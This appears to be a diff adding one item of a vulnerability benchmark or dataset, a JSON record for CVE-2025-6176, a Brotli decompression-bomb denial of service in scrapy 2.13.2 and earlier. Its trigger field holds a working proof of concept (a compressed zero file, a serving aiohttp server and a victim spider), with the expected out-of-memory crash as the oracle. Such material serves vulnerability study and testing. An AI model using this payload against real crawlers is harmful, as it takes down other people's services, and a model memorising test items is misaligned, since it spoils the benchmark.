@@ -1,0 +1,15 @@
+{
+  "file_id": "203_brotli_huntr_2c26a886-5984-47ee-a421-0d5fe1344eb0",
+  "numeric_id": "203",
+  "library_hint": "brotli",
+  "source": "huntr",
+  "title": "Brotli decompression bomb DoS in scrapy due to insufficient output size validation during decompression",
+  "cve": "CVE-2025-6176",
+  "cwe": "CWE-400: Denial of Service",
+  "library": "scrapy",
+  "affected_version": "<= 2.13.2",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "dd if=/dev/zero bs=1G count=64 | brotli -9 -o poc64.br\nfrom aiohttp import web\nasync def handler(req: web.Request) -> web.Response:\n    resp = web.Response(content_type=\"text/plain\")\n    with open(\"poc64.br\", \"rb\") as f:\n        resp.body = f.read()\n    resp.headers[\"Content-Encoding\"] = \"br\"\n    assert not resp.compression\n    return resp\nif __name__ == \"__main__\":\n    app = web.Application()\n    app.router.add_get(\"/\", handler)\n    web.run_app(app, port=8080)\n# test_scrapy.py\nimport scrapy\nclass QuotesSpider(scrapy.Spider):\n    name = \"victim\"\n    start_urls = [\"http://172.17.0.2:8080\",]\nscrapy runspider test_scrapy.py",
+  "oracle": "server crashes with exit code 137 (OOM)"
+}
